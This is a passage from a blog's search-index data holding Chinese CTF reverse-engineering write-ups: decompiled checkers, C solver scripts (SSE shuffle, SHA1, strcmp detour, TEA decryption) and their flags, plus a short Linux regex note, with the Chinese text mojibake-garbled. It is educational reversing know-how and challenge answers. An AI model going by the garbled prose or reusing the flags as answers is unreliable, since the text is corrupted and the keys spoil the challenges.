\u003c= 5 \u0026\u0026 a1[a1_cnt + 1] \u003c= 12) a1_cnt++; } switch (a1[a1_cnt]) { case 1: --flag_cnt; --v5; --a1_cnt; v3 = flag[v5 + 100]; break; case 2: flag[flag_cnt] = v3 - a1[a1_cnt + 1]; a1_cnt--; break; case 3: flag[flag_cnt] = v3 + (a1[a1_cnt + 1] \u0026 0x0000ffff); a1_cnt--; break; case 4: flag[flag_cnt] = v3 ^ a1[a1_cnt + 1]; a1_cnt--; break; case 5: flag[flag_cnt] = v3 / a1[a1_cnt + 1]; a1_cnt--; break; case 6: --a1_cnt; break; case 7: --v6; flag[v6 + 100] = a1[a1_cnt + 1]; a1_cnt--; break; case 8: --v4; --a1_cnt; v3 = flag[v4]; break; case 10: puts(flag); case 11: --a1_cnt; flag[flag_cnt] = v3 + 1; break; case 12: --a1_cnt; flag[flag_cnt] = v3 - 1; break; default: a1_cnt--; } } } flag{757515121f3d478} ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:27:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["WriteUps"],"content":"[GUET-CTF2019]number_game ç¬¬äºŒæ¬¡åšè¿™é¢˜äº†ï¼Œå‘ç°äº†ç§éé¢„æœŸè§£ï¼ˆ mainå‡½æ•° unsigned __int64 __fastcall main(int a1, char **a2, char **a3) { char *v4; // [rsp+8h] [rbp-38h] __int64 input; // [rsp+10h] [rbp-30h] BYREF __int16 v6; // [rsp+18h] [rbp-28h] char a1a[8]; // [rsp+20h] [rbp-20h] BYREF __int16 v8; // [rsp+28h] [rbp-18h] char v9; // [rsp+2Ah] [rbp-16h] unsigned __int64 v10; // [rsp+38h] [rbp-8h] v10 = __readfsqword(0x28u); input = 0LL; v6 = 0; *(_QWORD *)a1a = 0LL; v8 = 0; v9 = 0; __isoc99_scanf(\"%s\", \u0026input); if ( (unsigned int)check_len((const char *)\u0026input) ) { v4 = sub_400758((char *)\u0026input, 0, 10u); sub_400807(v4, a1a); v9 = 0; copy(a1a); if ( (unsigned int)sub_400917() ) { puts(\"TQL!\"); printf(\"flag{\"); printf(\"%s\", (const char *)\u0026input); puts(\"}\"); } else { puts(\"your are cxk!!\"); } } return __readfsqword(0x28u) ^ v10; } sub_400758 char *__fastcall sub_400758(char *input, int const_0, unsigned int len_input) { char v5; // [rsp+1Fh] [rbp-11h] char *v6; // [rsp+28h] [rbp-8h] v5 = input[const_0]; if ( v5 == ' ' || v5 == '\\n' || const_0 \u003e= (int)len_input ) return 0LL; v6 = (char *)malloc(0x18uLL); *v6 = v5; *((_QWORD *)v6 + 1) = sub_400758(input, 2 * const_0 + 1, len_input); *((_QWORD *)v6 + 2) = sub_400758(input, 2 * (const_0 + 1), len_input); return v6; } sub_400807 void __fastcall sub_400807(char *a1, char *a2) { if ( a1 ) { sub_400807(*((char **)a1 + 1), a2); a2[dword_601080++] = *a1; sub_400807(*((char **)a1 + 2), a2); } } copy void __fastcall sub_400881(char *a1) { byte_601060[2] = *a1; byte_601060[7] = a1[1]; byte_601060[9] = a1[2]; byte_601060[11] = a1[3]; byte_601060[14] = a1[4]; byte_601060[15] = a1[5]; byte_601060[17] = a1[6]; byte_601060[18] = a1[7]; byte_601060[22] = a1[8]; byte_601060[23] = a1[9]; } sub_400917 __int64 sub_400917() { unsigned int v1; // [rsp+0h] [rbp-10h] int i; // [rsp+4h] [rbp-Ch] int j; // [rsp+8h] [rbp-8h] int k; // [rsp+Ch] [rbp-4h] v1 = 1; for ( i = 0; i \u003c= 4; ++i ) { for ( j = 0; j \u003c= 4; ++j ) { for ( k = j + 1; k \u003c= 4; ++k ) { if ( byte_601060[5 * i + j] == byte_601060[5 * i + k] ) v1 = 0; if ( byte_601060[5 * j + i] == byte_601060[5 * k + i] ) v1 = 0; } } } return v1; } ä»åå¾€å‰çœ‹ï¼Œsub_400917å‡½æ•°ç»“åˆbyte_601060å‘ç°æ˜¯ä¸ª5*5çš„æ•°ç‹¬ï¼Œæ‰‹åŠ¨å¡«ä¸€ä¸‹ 1 4 #0 2 3 3 0 #4 1 #2 0 #1 2 3 #4 #2 3 #1 #4 0 4 2 #3 #0 1 å¾—åˆ°äº†ä¸»å‡½æ•°ä¸­çš„a1a 0421421430 ä¸Šé¢ä¸¤ä¸ªå‡½æ•°ï¼Œå°†inputé€å±‚å»ºäº†ä¸€ä¸ªäºŒå‰æ ‘ï¼Œç„¶åå†ä¸­åºéå†èµ‹å€¼ç»™ala æ­£å¸¸åšæ³•æ˜¯æ ¹æ®å¾—åˆ°çš„alaå³ä¸­åºéå†å»ºæ ‘ï¼Œç”±äºæ ‘ä»å·¦åˆ°å³ç”Ÿé•¿ï¼Œç¡®ä¿äº†ç­”æ¡ˆçš„å”¯ä¸€æ€§ï¼Œè¿™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡åšçš„æ—¶å€™çš„åšæ³•ï¼Œå¦‚å›¾ 1 1 3 4 2 4 0 0 2 4 //flagï¼š1134240024 è¿™æ¬¡åšçªç„¶æœ‰ä¸ªå¤§èƒ†çš„æƒ³æ³•ï¼Œç®—æ³•åªæ˜¯æ”¹å˜äº†æ•°å­—çš„é¡ºåºï¼Œé‚£ä¹ˆå¯ä¸å¯èƒ½ä¼šåœ¨å‡ æ¬¡æ”¹å˜é¡ºåºåå¾ªç¯å‘¢ï¼Ÿäºæ˜¯æœ‰äº†ä»¥ä¸‹å°è¯•ï¼Œæ¯æ¬¡å°†ä¸Šä¸€æ¬¡åŠ¨è°ƒå¾—åˆ°çš„æ”¹å˜åçš„æ•°ç»„å½“ä½œä¸‹ä¸€æ¬¡çš„è¾“å…¥ï¼Œå¹¸è¿çš„æ˜¯ï¼Œç¬¬6æ¬¡è¿‡åæˆ‘å°±è·å¾—äº†æˆåŠŸï¼Œæ•°æ®å¦‚ä¸‹ 0421421430 4134040221 2421104430 4134012024 0421404132 1134240024 0421421430 æ²¡æœ‰ä¸¥è°¨çš„è¯æ˜ï¼Œä½†è¿™ç¡®å®ä¸å¤±ä¸ºä¸€ç§å¾ˆé«˜æ•ˆçš„éé¢„æœŸè§£ flag{1134240024} ","date":"2022-02-23","objectID":"/2022/02/buu-re-wp/:28:0","tags":["CTF","reverse"],"title":"buu re wp","uri":"/2022/02/buu-re-wp/"},{"categories":["Linux"],"content":"Regular Expressionï¼ˆlinuxï¼‰ ","date":"2022-02-23","objectID":"/2022/02/regular-expressionlinux/:0:0","tags":["linux"],"title":"Regular Expressionï¼ˆlinuxï¼‰","uri":"/2022/02/regular-expressionlinux/"},{"categories":["Linux"],"content":"- åŸºæœ¬æ­£åˆ™è¡¨è¾¾å¼ ^ï¼šåŒ¹é…å¼€å¤´å†…å®¹ $ï¼šåŒ¹é…ç»“å°¾å†…å®¹ ^$ï¼šè¡¨ç¤ºç©ºè¡Œ .ï¼šåŒ¹é…ä¸€ä¸ªä»»æ„å­—ç¬¦ *ï¼šåŒ¹é…å‡ºç°æ¬¡æ•°ä¸º0æ¬¡æˆ–å¤šæ¬¡ ^.*ï¼šåŒ¹é…ä»¥ä»»æ„å¤šä¸ªå­—ç¬¦å¼€å¤´çš„å†…å®¹ .*$ï¼šåŒ¹é…ä»¥ä»»æ„å¤šä¸ªå­—ç¬¦ç»“å°¾çš„å†…å®¹ [abc]ï¼šåŒ¹é…abcä¸­ä»»æ„ä¸€ä¸ªå­—ç¬¦ [^abc]ï¼šåŒ¹é…abcä»¥å¤–ä»»æ„ä¸€ä¸ªå­—ç¬¦ ","date":"2022-02-23","objectID":"/2022/02/regular-expressionlinux/:0:1","tags":["linux"],"title":"Regular Expressionï¼ˆlinuxï¼‰","uri":"/2022/02/regular-expressionlinux/"},{"categories":["Linux"],"content":"- æ‰©å±•æ­£åˆ™è¡¨è¾¾å¼ +ï¼šåŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦1æ¬¡æˆ–å¤šæ¬¡ [abc]+ï¼šåŒ¹é…abcä¸­çš„ä¸€ä¸ªå­—ç¬¦ä¸€æ¬¡æˆ–å¤šæ¬¡ ï¼Ÿï¼šåŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦1æ¬¡æˆ–è€…0æ¬¡ |ï¼šè¡¨ç¤ºæˆ–è€…ï¼Œæˆ–ç®¡é“ç¬¦ {n,m}ï¼šåŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦æœ€å°‘næ¬¡ï¼Œæœ€å¤šmæ¬¡ {n}ï¼šåŒ¹é…å‰ä¸€ä¸ªå­—ç¬¦æ­£å¥½næ¬¡ ","date":"2022-02-23","objectID":"/2022/02/regular-expressionlinux/:0:2","tags":["linux"],"title":"Regular Expressionï¼ˆlinuxï¼‰","uri":"/2022/02/regular-expressionlinux/"},{"categories":["WriteUps"],"content":"ç¬¬ä¹å‘¨ ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:0:0","tags":["CTF","reverse"],"title":"å¼ºå£®é€†å‘äººwp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0x00 Hacking with Google: Beginner åšäº†ä¸€åŠå¡ä½äº†ï¼Œå·çœ‹äº†ä¸€ä¸‹å®˜æ–¹é¢˜è§£ï¼Œç„¶åå¤ç°ä¸€ä¸‹ idaå¾ˆå®¹æ˜“å®šä½åˆ°ä¸»å‡½æ•° int __cdecl main(int argc, const char **argv, const char **envp) { int v3; // er12 __m128i v5; // [rsp+0h] [rbp-38h] BYREF __m128i s2[2]; // [rsp+10h] [rbp-28h] BYREF printf(\"Flag: \"); __isoc99_scanf(\"%15s\", \u0026v5); s2[0] = _mm_xor_si128( _mm_add_epi32(_mm_shuffle_epi8(_mm_load_si128(\u0026v5), (__m128i)SHUFFLE), (__m128i)ADD32), (__m128i)XOR); if ( !strncmp(v5.m128i_i8, (const char *)s2, 0x10uLL) \u0026\u0026 (v3 = strncmp((const char *)s2, EXPECTED_PREFIX, 4uLL)) == 0 ) { puts(\"SUCCESS\"); } else { v3 = 1; puts(\"FAILURE\"); } return v3; } å¯ä»¥çœ‹åˆ°å„ç§SSEæŒ‡ä»¤ è¿™é‡Œè¦æ³¨æ„addæ˜¯æŠŠæ¯å››å­—èŠ‚æ‰“åŒ…ï¼ˆpackï¼‰ç„¶åè¿›è¡Œæ±‚å’Œï¼Œè€Œå¼‚æˆ–æ˜¯é€å­—èŠ‚è¿›è¡Œå¼‚æˆ– _mm_shuffle_epi8 æ— æ³•è§åçŸ¥ä¹‰ï¼Œå®˜æ–¹æè¿°åŠ æŸ¥æ‰¾å„ç§è§£é‡Šç»ˆäºææ‡‚ï¼Œè§æ³¨é‡Š FOR j := 0 to 15 //éå†16ä¸ªå­—èŠ‚ i := j*8 //éå†æ¯ä¸ªå­—èŠ‚ä¸­çš„8ä¸ªbit IF b[i+7] == 1 //å½“å‰å­—èŠ‚æœ€é«˜ä½ä¸º1 dst[i+7:i] := 0 //æ•´ä¸ªå­—èŠ‚8bitå…¨ç½®ä¸º0 ELSE index[3:0] := b[i+3:i] //ç›¸å½“äºä»¥intå½¢å¼å–å‡ºbä¸­çš„å€¼å­˜å…¥index dst[i+7:i] := a[index*8+7:index*8] //æŠŠaæ•°ç»„ä¸‹æ ‡ä¸ºindex[i]çš„å€¼æ”¾å…¥dstæ•°ç»„ FI ENDFOR ç”±äºå¯è§å­—ç¬¦ä¸º32-126ï¼Œä¸å¯èƒ½æœ€é«˜ä½ä¸º1ï¼Œæ‰€ä»¥å…¨ç½®ä¸º0çš„æƒ…å†µä¸ä¼šå‘ç”Ÿ å³shuffleå°±æ˜¯æŠŠåŸæ•°ç»„aæŒ‰bçš„é¡ºåºé‡æ–°æ’åˆ—äº†ä¸€éï¼Œå…¶ä¸­å€¼æ²¡æœ‰æ”¹å˜ é¢˜ç›®éªŒè¯é€»è¾‘ flag-\u003eshuffle-\u003eadd-\u003exor == flag \u0026\u0026 flagå‰å››ä½ä¸ºCTF{ ï¼ˆè¿™é‡Œæ³¨æ„è¾“å…¥çš„ç¬¬16ä½æ˜¯å­—ç¬¦ä¸²ç»“æŸæ ‡å¿—\\0 æ˜¾ç„¶æˆ‘ä»¬å¯ä»¥æ ¹æ®å‰å››ä½æ¨å‡ºä¸€äº›ä¸œè¥¿ ä»åå¾€å‰æ¨ flag 0x43 0x54 0x46 0x7b xornum 0x76 0x58 0xB4 0x49 xor_pre 0x35 0x0c 0xf2 0x32 xor_pre 0x32f20c35 addnum 0x0DEADBEEF add_pre 0x54444d46 add_pre 0x46 0x4d 0x44 0x54 shufflenum 2 6 7 1 äºæ˜¯æˆ‘ä»¬çŸ¥é“äº†ç¬¬6ã€7ä½åˆ†åˆ«ä¸ºMã€Dï¼Œå³CTF{--MD------}\\0 è¿™æ—¶æˆ‘ä»¬æƒ³åˆ°ï¼Œæœ€ä½ä½ï¼ˆå­—èŠ‚ï¼‰çš„å€¼è¿›è¡Œaddæ“ä½œæ—¶ä¸ä¼šå—å…¶ä»–å­—èŠ‚çš„å½±å“ï¼ˆä¸ä¼šå—è¿›ä½çš„å½±å“ è¦ç¡®ä¿å·²çŸ¥å­—ç¬¦æ˜¯shuffleåçš„æœ€ä½ä½ï¼Œæˆ‘ä»¬æƒ³åˆ°äº†\\0ï¼Œå¹¶ä¸”è¿™æ¬¡éœ€è¦æ­£ç€æ¨ ä¸ºçœäº‹å†™ä¸ªè„šæœ¬ #include\u003cstdio.h\u003e int xornum[] = {0x76, 0x58, 0xB4, 0x49, 0x8D, 0x1A, 0x5F, 0x38, 0xD4, 0x23, 0xF8, 0x34, 0xEB, 0x86, 0xF9, 0xAA}; int addnum[] = {0xEF, 0xBE, 0xAD, 0xDE, 0xAD, 0xDE, 0xE1, 0xFE, 0x37, 0x13, 0x37, 0x13, 0x66, 0x74, 0x63, 0x67}; int shufflenum[] = {2,6,7,1,5,11,9,14,3,15,4,8,10,12,13,0}; int main(){ int alpha,index,pre_index; //indexæ˜¯shuffleä¹‹åçš„ä¸‹æ ‡ï¼Œpre_indexæ˜¯shuffleä¹‹å‰çš„ä¸‹æ ‡ scanf(\"%x%d\",\u0026alpha,\u0026index); for (int i = 0; i \u003c 16; i++){ if(index==shufflenum[i]) pre_index = i; } unsigned char newalpha = ((alpha+addnum[pre_index]))^xornum[pre_index]; printf(\"0x%x %c %d\",newalpha,newalpha,pre_index); } // input:0 15 // output:0x30 0 9 // input:0x7b 3 // output:0x66 f 8 äºæ˜¯å¾—åˆ°äº†flagç¬¬ä¹ä½ä¸º0ï¼Œå³CTF{--MD-0----}\\0 åŒæ ·ç”¨ { å¯ä»¥å¾—åˆ°ç¬¬8ä½ä¸º fï¼Œå³CTF{--MDf0----}\\0 ä½†æˆ‘ä»¬å·²ç»ç”¨å®Œäº†æ‰€æœ‰çš„æœ€ä½å­—èŠ‚ æˆ‘ä»¬å¦‚æœä½¿ç”¨å…¶ä»–å­—èŠ‚å°±ä¼šé¢ä¸´è¿›ä½çš„é—®é¢˜ï¼Œä½†æˆ‘ä»¬ä¹Ÿä¸æ’é™¤è¿˜æœ‰å…¶ä»–æ²¡æœ‰ä½¿ç”¨çš„ï¼Œæ²¡æœ‰è¿›ä½çš„å­—ç¬¦ å¦‚æœå»è€ƒè™‘ä¸€éæ‰€æœ‰çš„ä½æ˜¯å¦å­˜åœ¨è¿›ä½é—®é¢˜æ˜¯ä¸€ä¸ªæµ©å¤§çš„å·¥ç¨‹ æ‰€ä»¥æˆ‘ä»¬çš„æƒ³æ³•æ˜¯ç¢°ç¢°è¿æ°”ï¼Œå¦‚æœæ¨å‡ºçš„å­—ç¬¦ä¸å·²çŸ¥çŸ›ç›¾å°±èˆå¼ƒï¼Œå¦‚æœä¸çŸ›ç›¾å°±ä¿ç•™ï¼ˆè¿™çœŸæ˜¯å®˜æ–¹æ–¹æ³• åœ¨æŠŠæ‰€æœ‰ä½è¯•è¿‡ä¸€éä¹‹åï¼Œæˆ‘ä»¬ä¼šé€æ¸å¾—åˆ°flag CTF{--MDf0-M--}\\0 CTF{-1MDf0-M--}\\0 CTF{S1MDf0-M--}\\0 CTF{S1MDf0rM--}\\0 CTF{S1MDf0rM3-}\\0 CTF{S1MDf0rM3!}\\0 CTF{S1MDf0rM3!}\\0 ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:1:0","tags":["CTF","reverse"],"title":"å¼ºå£®é€†å‘äººwp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0x01 V\u0026N å…¬å¼€èµ› CSRe dieæŸ¥ï¼Œå‘ç°protector: Eazfuscator æŸ¥äº†ä¸€ä¸‹ï¼Œæ˜¯ä¸€ç§.Netä»£ç æ··æ·†æ–¹æ³•ï¼Œå¯ä»¥ç”¨de4dotåæ··æ·†ï¼Œç„¶ådnspyåç¼–è¯‘ è¿™é“é¢˜éœ€è¦è€å¿ƒï¼Œå°è¯•æœç´¢flagå­—ç¬¦ä¸²ï¼Œç¿»äº†åå¤šåˆ†é’Ÿç»ˆäºæ‰¾åˆ°Main using System; using System.Security.Cryptography; using System.Text; // Token: 0x02000006 RID: 6 internal sealed class Class3 { // Token: 0x0600000D RID: 13 RVA: 0x000022C8 File Offset: 0x000004C8 public string method_0(string string_0, string string_1) { string text = string.Empty; char[] array = string_0.ToCharArray(); char[] array2 = string_1.ToCharArray(); int num = (array.Length \u003c array2.Length) ? array.Length : array2.Length; for (int i = 0; i \u003c num; i++) { text += (int)(array[i] ^ array2[i]); } return text; } // Token: 0x0600000E RID: 14 RVA: 0x0000231C File Offset: 0x0000051C public static string smethod_0(string string_0) { byte[] bytes = Encoding.UTF8.GetBytes(string_0); byte[] array = SHA1.Create().ComputeHash(bytes); StringBuilder stringBuilder = new StringBuilder(); foreach (byte b in array) { stringBuilder.Append(b.ToString(\"X2\")); } return stringBuilder.ToString(); } // Token: 0x0600000F RID: 15 RVA: 0x00002374 File Offset: 0x00000574 private static void Main(string[] args) { if (!Class1.smethod_1()) { return; } bool flag = true; Class3 @class = new Class3(); string str = Console.ReadLine(); if (Class3.smethod_0(\"3\" + str + \"9\") != \"B498BFA2498E21325D1178417BEA459EB2CD28F8\") { flag = false; } string text = Console.ReadLine(); string string_ = Class3.smethod_0(\"re\" + text); string text2 = @class.method_0(string_, \"63143B6F8007B98C53CA2149822777B3566F9241\"); for (int i = 0; i \u003c text2.Length; i++) { if (text2[i] != '0') { flag = false; } } if (flag) { Console.WriteLine(\"flag{\" + str + text + \"}\"); } } } å¯ä»¥çœ‹åˆ°flagç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œå³strå’Œtext classã€‚method_0åƒæ˜¯ä¸ªåŠ å¯†ç®—æ³•ï¼Œå¾—åˆ°ä¸¤ä¸²å­—ç¬¦ä¸² ç›´æ¥ä¸¢åˆ°Cmd5ç½‘ç«™è§£å¯†ï¼ŒåŸæ¥æ˜¯Sha1åŠ å¯† å¾—åˆ°\"3\" + str + \"9\"==314159,\"re\" + text ==return æ•…flag{1415turn} ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:2:0","tags":["CTF","reverse"],"title":"å¼ºå£®é€†å‘äººwp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0x02 Zer0pts2020 easy-strcmp idaè½½å…¥ï¼Œmainå‡½æ•° __int64 __fastcall main(int a1, char **a2, char **a3) { if ( a1 \u003e 1 ) { if ( !strcmp(a2[1], \"zer0pts{********CENSORED********}\") ) puts(\"Correct!\"); else puts(\"Wrong!\"); } else { printf(\"Usage: %s \u003cFLAG\u003e\\n\", *a2); } return 0LL; } é†’ç›®çš„strcmpå’Œä¸€ä¸²å­—ç¬¦ä¸²ï¼Œéš¾é“è¿™å°±æ˜¯flagï¼Ÿè‚¯å®šä¸æ˜¯ ç¿»å‡½æ•°åˆ—è¡¨å‘ç°ä¸¤ä¸ªç‰¹åˆ«çš„å‡½æ•° int (**sub_563477E00795())(const char *s1, const char *s2) { int (**result)(const char *, const char *); // rax result = \u0026strcmp; qword_563478001090 = (__int64 (__fastcall *)(_QWORD, _QWORD))\u0026strcmp; off_563478001028 = sub_563477E006EA; return result; } __int64 __fastcall sub_563477E006EA(__int64 a1, __int64 a2) { int i; // [rsp+18h] [rbp-8h] int v4; // [rsp+18h] [rbp-8h] int j; // [rsp+1Ch] [rbp-4h] for ( i = 0; *(_BYTE *)(i + a1); ++i ) ; v4 = (i \u003e\u003e 3) + 1; for ( j = 0; j \u003c v4; ++j ) *(_QWORD *)(8 * j + a1) -= qword_563478001060[j]; return qword_563478001090(a1, a2); } å¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªå‡½æ•°sub_563477E00795è®°å½•äº†strcmpå‡½æ•°çš„åœ°å€ï¼Œç„¶åè°ƒç”¨äº†å‡½æ•°sub_563477E006EA ç›¸å½“äºæŠŠstrcmpå‡½æ•°ç»™æ”¹äº†ï¼Œå®é™…æ‰§è¡Œçš„æ˜¯ç¬¬äºŒä¸ªå‡½æ•°sub_563477E006EA å³æŠŠçœŸæ­£çš„flagåŠ å¯†äº†ï¼Œç„¶åä¸mainå‡½æ•°é‡Œçš„å­—ç¬¦ä¸²æ¯”è¾ƒ è¿™é‡Œæ³¨æ„mainå‡½æ•°é‡Œä¼ çš„æ˜¯ a2[1]ï¼Œå³è·³è¿‡äº†zer0pts qword_563478001060åˆšå¥½32ä¸ªå­—èŠ‚éç©ºï¼Œå¯¹åº”ä¿®æ”¹ * åŠå…¶ä¸­é—´å­—ç¬¦å…±32ä¸ªå­—èŠ‚ äºæ˜¯å†™è„šæœ¬æ‹¿flag #include\u003cstdio.h\u003e unsigned char key[] = { 0x42, 0x09, 0x4A, 0x49, 0x35, 0x43, 0x0A, 0x41, 0xF0, 0x19, 0xE6, 0x0B, 0xF5, 0xF2, 0x0E, 0x0B, 0x2B, 0x28, 0x35, 0x4A, 0x06, 0x3A, 0x0A, 0x4F }; char en_flag[]=\"********CENSORED********\"; unsigned long long flag[5]; int main(){ for(int i=0;i\u003c3;i++){ flag[i]=*((unsigned long long *)key+i)+*((unsigned long long *)en_flag+i); } for(int i=0;i\u003c24;i++){ printf(\"%c\",*((unsigned char *)flag+i)); } } //zer0pts{l3ts_m4k3_4_DETOUR_t0d4y} åˆšå¼€å§‹è¿˜çŠ¯äº†é”™è¯¯ï¼Œé€å­—èŠ‚è§£å¯†å¾—åˆ°é”™è¯¯flagï¼šl3ts_m4k3^4^DDSOUR_t0d4y å› ä¸ºé¢˜ç›®æ˜¯å°†æ¯8å­—èŠ‚æ‰“åŒ…è¿›è¡ŒåŠ æ³•ï¼Œå…¶ä¸­æœ‰è¿›ä½ï¼Œè€Œé€å­—èŠ‚åŠ æ³•ä¸ä¼šäº§ç”Ÿè¿›ä½ï¼Œæ‰€ä»¥å‡ºäº†é—®é¢˜ ç¬¬å…«å‘¨ ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:3:0","tags":["CTF","reverse"],"title":"å¼ºå£®é€†å‘äººwp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0x00 å¤§ä½¬å–èŒ¶~ å·æ‡’æ²¡æœ‰ç®¡èŠ±æŒ‡ä»¤ idaè½½å…¥ï¼Œè¿›mainå‡½æ•° __int64 __fastcall main(int a1, char **a2, char **a3) { int j; // [rsp+14h] [rbp-7Ch] int i; // [rsp+18h] [rbp-78h] char input[48]; // [rsp+20h] [rbp-70h] BYREF char v7[32]; // [rsp+50h] [rbp-40h] BYREF __int64 v8[4]; // [rsp+70h] [rbp-20h] BYREF v8[3] = __readfsqword(0x28u); v8[0] = 0x4837F6D54BAA4D13LL; v8[1] = 0x203F4E88752F3489LL; printf(\"Hello there. Plz Input your flag: \"); __isoc99_scanf(\"%40s\", input); if ( strlen(input) != 32 ) { printf(\"nope\\n\"); exit(0); } for ( i = 0; i \u003c 32; ++i ) v7[i] = input[i]; ((void (__fastcall *)(__int64 *, char *, __int64))sub_1180)(v8, v7, 4LL); for ( j = 0; j \u003c 32; ++j ) { if ( (unsigned __int8)v7[j] != en_flag[j] ) { printf(\"nope\\n\"); exit(0); } } printf(\"you are right!\\n\"); return 0LL; } å¯ä»¥çœ‹å‡ºå°±æ˜¯æŠŠinputå¤åˆ¶ç»™v7ç„¶åç»sub_1180å‡½æ•°åŠ å¯†ç„¶åå’Œen_flagæ¯”è¾ƒ è·Ÿè¿›sub_1180 __int64 __fastcall sub_1180(unsigned int *a1, __int64 a2, unsigned int a3) { unsigned int v4; // [rsp+0h] [rbp-4Ch] unsigned int v5; // [rsp+4h] [rbp-48h] unsigned int v6; // [rsp+8h] [rbp-44h] unsigned int v7; // [rsp+Ch] [rbp-40h] unsigned int j; // [rsp+14h] [rbp-38h] unsigned int i; // [rsp+18h] [rbp-34h] int v10; // [rsp+1Ch] [rbp-30h] unsigned int v11; // [rsp+20h] [rbp-2Ch] unsigned int v12; // [rsp+24h] [rbp-28h] v7 = _byteswap_ulong(*a1); v6 = _byteswap_ulong(a1[1]); v5 = _byteswap_ulong(a1[2]); v4 = _byteswap_ulong(a1[3]); for ( i = 0; i \u003c a3; ++i ) { v10 = 0; v12 = *(unsigned __int8 *)(a2 + 8 * i + 3) | (*(unsigned __int8 *)(a2 + 8 * i + 2) \u003c\u003c 8) | (*(unsigned __int8 *)(a2 + 8 * i + 1) \u003c\u003c 16) | (*(unsigned __int8 *)(a2 + 8 * i) \u003c\u003c 24); v11 = *(unsigned __int8 *)(a2 + 8 * i + 7) | (*(unsigned __int8 *)(a2 + 8 * i + 6) \u003c\u003c 8) | (*(unsigned __int8 *)(a2 + 8 * i + 5) \u003c\u003c 16) | (*(unsigned __int8 *)(a2 + 8 * i + 4) \u003c\u003c 24); for ( j = 0; j \u003c 0x20; ++j ) { v10 -= 1640531527; v12 += (v6 + (v11 \u003e\u003e 5)) ^ (v10 + v11) ^ (v7 + 16 * v11); v11 += (v4 + (v12 \u003e\u003e 5)) ^ (v10 + v12) ^ (v5 + 16 * v12); } *(_BYTE *)(a2 + 8 * i) = HIBYTE(v12); *(_BYTE *)(a2 + 8 * i + 1) = BYTE2(v12); *(_BYTE *)(a2 + 8 * i + 2) = BYTE1(v12); *(_BYTE *)(a2 + 8 * i + 3) = v12; *(_BYTE *)(a2 + 8 * i + 4) = HIBYTE(v11); *(_BYTE *)(a2 + 8 * i + 5) = BYTE2(v11); *(_BYTE *)(a2 + 8 * i + 6) = BYTE1(v11); *(_BYTE *)(a2 + 8 * i + 7) = v11; } return 0LL; } èƒ½çœ‹å‡ºæ¥å°±æ˜¯teaåŠ å¯† _byteswap_ulongè¿™ä¸ªç»†èŠ‚éœ€è¦æ³¨æ„ï¼Œç”¨å¤„æ˜¯æŠŠå‚æ•°å€¼ä»¥å­—èŠ‚ä¸ºå•ä½é¢ å€’å‰åé¡ºåºï¼Œä¹Ÿå¯ä»¥ç›´æ¥åŠ¨è°ƒå¾—åˆ°ï¼Œå³ä¸ºkeyå¯†é’¥ å†™è„šæœ¬æ‹¿flag #include\u003cstdio.h\u003e unsigned char en_flag[32] ={104,16,10,183,126,253,224,41,184,177,19,193,252,91,54,195,103,70,92,25,222,185,88,154,107,135,19,206,70,106,56,107}; // int key[]={0x4BAA4D13,0x4837F6D5,0x752F3489,0x203F4E88}; unsigned int key[]={0x134daa4b,0xd5f63748,0x89342f75,0x884e3f20}; int delta =0x61C88647,v9; unsigned char flag[100]; unsigned int v10,v11; int main(){ for(int i=0;i\u003c4;i++){ *((char *)\u0026v11+3)=*(en_flag + 8 * i); *((char *)\u0026v11+2)=*(en_flag + 8 * i+1); *((char *)\u0026v11+1)=*(en_flag + 8 * i+2); *((char *)\u0026v11)=*(en_flag + 8 * i+3); *((char *)\u0026v10+3)=*(en_flag + 8 * i+4); *((char *)\u0026v10+2)=*(en_flag + 8 * i+5); *((char *)\u0026v10+1)=*(en_flag + 8 * i+6); *((char *)\u0026v10)=*(en_flag + 8 * i+7); for(int j=0x20-1;j\u003e=0;j--){ v9=(j+1)*delta*(-1); v10 -= (key[3] + (v11 \u003e\u003e 5)) ^ (v9 + v11) ^ (key[2] + 16 * v11); v11 -= (key[1] + (v10 \u003e\u003e 5)) ^ (v9 + v10) ^ (key[0] + 16 * v10); } *(flag + 8 * i) = *((char *)\u0026v11+3); *(flag + 8 * i + 1) = *((char *)\u0026v11+2); *(flag + 8 * i + 2) = *((char *)\u0026v11+1); *(flag + 8 * i + 3) = *((char *)\u0026v11); *(flag + 8 * i + 4) = *((char *)\u0026v10+3); *(flag + 8 * i + 5) = *((char *)\u0026v10+2); *(flag + 8 * i + 6) = *((char *)\u0026v10+1); *(flag + 8 * i + 7) = *((char *)\u0026v10); } puts(flag); } //19d9346d-410a-441f-b14e-9a60bb05 ","date":"2022-02-08","objectID":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/:4:0","tags":["CTF","reverse"],"title":"å¼ºå£®é€†å‘äººwp","uri":"/2022/02/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA-wp/"},{"categories":["WriteUps"],"content":"0x01 N1CTF oflo å¤ªéš¾å•¦~ æ 